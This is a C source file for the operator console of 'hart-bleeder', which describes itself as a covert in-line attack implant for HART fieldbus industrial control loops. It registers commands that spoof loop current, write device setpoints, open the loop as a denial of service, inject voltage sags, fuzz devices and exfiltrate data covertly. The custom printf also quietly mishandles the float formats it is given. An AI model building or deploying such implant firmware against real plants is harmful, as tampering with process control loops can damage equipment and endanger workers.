/*
 * hart-bleeder — console.c
 * USB-CDC console with command-line interface for operator control
 * of the HART Fieldbus Covert In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include "board.h"
#include "registers.h"
#include "console.h"
#include "hart_stack.h"
#include "loop_drv.h"
#include "attacks.h"
#include "storage.h"
#include "c2link.h"
#include "modem_drv.h"
#include <string.h>
#include <stdarg.h>

#define CONSOLE_BUF_LEN  256
#define MAX_CMDS        32
#define MAX_ARGS         8

typedef struct {
    char name[16];
    char help[64];
    cmd_handler_t fn;
} cmd_entry_t;

static cmd_entry_t s_cmds[MAX_CMDS];
static uint8_t s_ncmds = 0;
static char s_rxbuf[CONSOLE_BUF_LEN];
static uint16_t s_rxlen = 0;

/* ── USART1 (USB-CDC via ST-Link VCP) console output ─────────── */
static void con_putc(char c) { uart_putc(USART1_BASE, (uint8_t)c); }

static void con_puts(const char *s) {
    while (*s) con_putc(*s++);
}

/* ── Minimal printf ──────────────────────────────────────────── */
void console_printf(const char *fmt, ...) {
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    /* Tiny vsnprintf substitute: handle %s %d %u %x %02X %c %% */
    char *o = buf;
    const char *f = fmt;
    while (*f && (o - buf) < (int)sizeof(buf) - 16) {
        if (*f != '%') { *o++ = *f++; continue; }
        f++;
        int width = 0; int zero = 0;
        if (*f == '0') { zero = 1; f++; }
        while (*f >= '0' && *f <= '9') { width = width * 10 + (*f - '0'); f++; }
        switch (*f) {
        case 's': {
            char *s = va_arg(ap, char*);
            while (*s) *o++ = *s++;
            break;
        }
        case 'd': {
            int v = va_arg(ap, int);
            if (v < 0) { *o++ = '-'; v = -v; }
            char tmp[12]; int i = 0;
            if (v == 0) tmp[i++] = '0';
            while (v) { tmp[i++] = '0' + (v % 10); v /= 10; }
            while (width-- > i) *o++ = zero ? '0' : ' ';
            while (i) *o++ = tmp[--i];
            break;
        }
        case 'u': {
            unsigned v = va_arg(ap, unsigned);
            char tmp[12]; int i = 0;
            if (v == 0) tmp[i++] = '0';
            while (v) { tmp[i++] = '0' + (v % 10); v /= 10; }
            while (width-- > i) *o++ = zero ? '0' : ' ';
            while (i) *o++ = tmp[--i];
            break;
        }
        case 'x': case 'X': {
            unsigned v = va_arg(ap, unsigned);
            char tmp[12]; int i = 0;
            const char *hex = (*f == 'X') ? "0123456789ABCDEF" : "0123456789abcdef";
            if (v == 0) tmp[i++] = '0';
            while (v) { tmp[i++] = hex[v & 0xF]; v >>= 4; }
            while (width-- > i) *o++ = zero ? '0' : ' ';
            while (i) *o++ = tmp[--i];
            break;
        }
        case 'c': *o++ = (char)va_arg(ap, int); break;
        case '%': *o++ = '%'; break;
        default: *o++ = '%'; *o++ = *f; break;
        }
        f++;
    }
    *o = 0;
    con_puts(buf);
    va_end(ap);
}

/* ── Init ────────────────────────────────────────────────────── */
int console_init(void) {
    uart_init(USART1_BASE, 115200);
    s_rxlen = 0;
    con_puts("\r\nHART-Bleeder console — jayis1\r\n");
    con_puts("Type 'help' for commands.\r\n> ");
    return 0;
}

/* ── Register command ────────────────────────────────────────── */
int console_register(const char *name, const char *help, cmd_handler_t fn) {
    if (s_ncmds >= MAX_CMDS) return -1;
    strncpy(s_cmds[s_ncmds].name, name, sizeof(s_cmds[s_ncmds].name) - 1);
    strncpy(s_cmds[s_ncmds].help, help, sizeof(s_cmds[s_ncmds].help) - 1);
    s_cmds[s_ncmds].fn = fn;
    s_ncmds++;
    return 0;
}

/* ── Tokenize ────────────────────────────────────────────────── */
static int tokenize(char *line, char **argv, int max) {
    int argc = 0;
    char *p = line;
    while (*p && argc < max) {
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;
        argv[argc++] = p;
        while (*p && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') p++;
        if (*p) { *p = 0; p++; }
    }
    return argc;
}

/* ── Dispatch ────────────────────────────────────────────────── */
static void dispatch(char *line) {
    char *argv[MAX_ARGS];
    int argc = tokenize(line, argv, MAX_ARGS);
    if (argc == 0) { con_puts("> "); return; }
    for (uint8_t i = 0; i < s_ncmds; i++) {
        if (strcmp(argv[0], s_cmds[i].name) == 0) {
            int rc = s_cmds[i].fn(argc, argv);
            if (rc != 0) console_printf("rc=%d\r\n", rc);
            con_puts("> ");
            return;
        }
    }
    console_printf("unknown: %s\r\n> ", argv[0]);
}

/* ── getline from USART1 ─────────────────────────────────────── */
int console_getline(char *buf, uint16_t max) {
    uint16_t n = 0;
    while (n < max - 1) {
        int c = uart_getc(USART1_BASE);
        if (c < 0) return -1;
        if (c == '\r' || c == '\n') { buf[n] = 0; return n; }
        if (c == 0x7F || c == 0x08) { if (n) n--; continue; }
        buf[n++] = (char)c;
    }
    buf[n] = 0;
    return n;
}

/* ── Main task ───────────────────────────────────────────────── */
void console_task(void) {
    /* Non-blocking read from USART1 */
    usart_regs_t *u = (usart_regs_t *)USART1_BASE;
    while (u->ISR & USART_ISR_RXNE) {
        char c = (char)(u->RDR & 0xFF);
        if (c == '\r' || c == '\n') {
            s_rxbuf[s_rxlen] = 0;
            if (s_rxlen > 0) dispatch(s_rxbuf);
            else con_puts("> ");
            s_rxlen = 0;
        } else if (c == 0x7F || c == 0x08) {
            if (s_rxlen) s_rxlen--;
        } else if (s_rxlen < CONSOLE_BUF_LEN - 1) {
            s_rxbuf[s_rxlen++] = c;
        }
    }
}

/* ── Help ────────────────────────────────────────────────────── */
void console_help(void) {
    con_puts("Commands:\r\n");
    for (uint8_t i = 0; i < s_ncmds; i++) {
        console_printf("  %-10s %s\r\n", s_cmds[i].name, s_cmds[i].help);
    }
}

/* ── Built-in commands ───────────────────────────────────────── */
static int cmd_help(int argc, char **argv) { (void)argc; (void)argv; console_help(); return 0; }

static int cmd_status(int argc, char **argv) {
    (void)argc; (void)argv;
    loop_state_t ls; loop_sample(&ls);
    console_printf("Loop: I=%.3f mA  V=%.2f V  PV=%.1f%%  fault=0x%X\r\n",
                   ls.i_ma, ls.v_loop, ls.pv_pct, ls.fault);
    console_printf("Mode: %u  Devices: %u  TX=%u RX=%u TMO=%u CRC=%u\r\n",
                   loop_get_mode(), g_hart.n_devices,
                   g_hart.stats_tx, g_hart.stats_rx,
                   g_hart.stats_timeout, g_hart.stats_crc_err);
    loop_stats_t st; loop_get_stats(&st);
    console_printf("Stats: samples=%u faults=%u I[%..3f..%.3f] V[%.2f..%.2f]\r\n",
                   st.samples, st.faults, st.i_min_ma, st.i_max_ma,
                   st.v_min_v, st.v_max_v);
    return 0;
}

static int cmd_scan(int argc, char **argv) {
    (void)argc; (void)argv;
    console_printf("Enumerating HART bus (cmd 0 sweep)...\r\n");
    int n = hart_enumerate_bus();
    if (n <= 0) { console_printf("No devices found.\r\n"); return -1; }
    attacks_print_devices(g_hart.devices, g_hart.n_devices);
    return 0;
}

static int cmd_readpv(int argc, char **argv) {
    if (argc < 2) { console_printf("usage: readpv <addr>\r\n"); return -1; }
    uint8_t addr = (uint8_t)atoi(argv[1]);
    float pct, ma;
    int rc = attacks_read_pv(addr, &pct, &ma);
    if (rc == ATK_OK) console_printf("PV=%.2f%%  I=%.3f mA\r\n", pct, ma);
    else console_printf("readpv failed: %d\r\n", rc);
    return rc;
}

static int cmd_spoof(int argc, char **argv) {
    if (argc < 2) { console_printf("usage: spoof <mA>\r\n"); return -1; }
    float ma = (float)atof(argv[1]);
    console_printf("spoofing loop current to %.3f mA\r\n", ma);
    return attacks_spoof_pv(ma);
}

static int cmd_setpt(int argc, char **argv) {
    if (argc < 3) { console_printf("usage: setpt <addr> <pct>\r\n"); return -1; }
    uint8_t addr = (uint8_t)atoi(argv[1]);
    float pct = (float)atof(argv[2]);
    return attacks_write_setpoint(addr, pct);
}

static int cmd_dos(int argc, char **argv) {
    if (argc < 2) { console_printf("usage: dos <ms>\r\n"); return -1; }
    uint32_t ms = (uint32_t)atoi(argv[1]);
    console_printf("WARNING: opening loop for %u ms\r\n", ms);
    return attacks_loop_dos(ms);
}

static int cmd_sag(int argc, char **argv) {
    if (argc < 3) { console_printf("usage: sag <ms> <pct>\r\n"); return -1; }
    uint32_t ms = (uint32_t)atoi(argv[1]);
    float pct = (float)atof(argv[2]);
    return attacks_sag_inject(ms, pct);
}

static int cmd_capture(int argc, char **argv) {
    if (argc < 2) { console_printf("usage: capture <ms>\r\n"); return -1; }
    uint32_t ms = (uint32_t)atoi(argv[1]);
    return attacks_burst_capture(ms);
}

static int cmd_fuzz(int argc, char **argv) {
    if (argc < 3) { console_printf("usage: fuzz <addr> <count>\r\n"); return -1; }
    uint8_t addr = (uint8_t)atoi(argv[1]);
    uint16_t count = (uint16_t)atoi(argv[2]);
    return attacks_fuzz(addr, count);
}

static int cmd_covert(int argc, char **argv) {
    if (argc < 2) { console_printf("usage: covert <msg>\r\n"); return -1; }
    return attacks_covert_exfil((const uint8_t *)argv[1], strlen(argv[1]));
}

static int cmd_passive(int argc, char **argv) {
    (void)argc; (void)argv;
    loop_set_mode(LOOP_MODE_PASSIVE);
    console_printf("mode -> PASSIVE\r\n");
    return 0;
}

static int cmd_mode(int argc, char **argv) {
    if (argc < 2) { console_printf("usage: mode <0=pass 1=inj 2=clamp 3=sag 4=open>\r\n"); return -1; }
    loop_set_mode((loop_mode_t)atoi(argv[1]));
    return 0;
}

static int cmd_reboot(int argc, char **argv) {
    (void)argc; (void)argv;
    con_puts("rebooting...\r\n");
    NVIC_SystemReset();
    return 0;
}

/* ── Register all built-in commands ──────────────────────────── */
void console_register_cmds(void) {
    console_register("help",    "show commands",          cmd_help);
    console_register("status",  "loop + stack status",    cmd_status);
    console_register("scan",    "enumerate HART bus",      cmd_scan);
    console_register("readpv",  "read PV <addr>",         cmd_readpv);
    console_register("spoof",   "clamp loop <mA>",         cmd_spoof);
    console_register("setpt",   "write setpoint <a> <%>",  cmd_setpt);
    console_register("dos",     "open-loop DoS <ms>",      cmd_dos);
    console_register("sag",     "voltage sag <ms> <%>",    cmd_sag);
    console_register("capture", "burst capture <ms>",     cmd_capture);
    console_register("fuzz",    "fuzz <addr> <count>",     cmd_fuzz);
    console_register("covert",   "covert exfil <msg>",     cmd_covert);
    console_register("passive",  "return to passive",       cmd_passive);
    console_register("mode",    "set loop mode <n>",       cmd_mode);
    console_register("reboot",  "reset MCU",               cmd_reboot);
}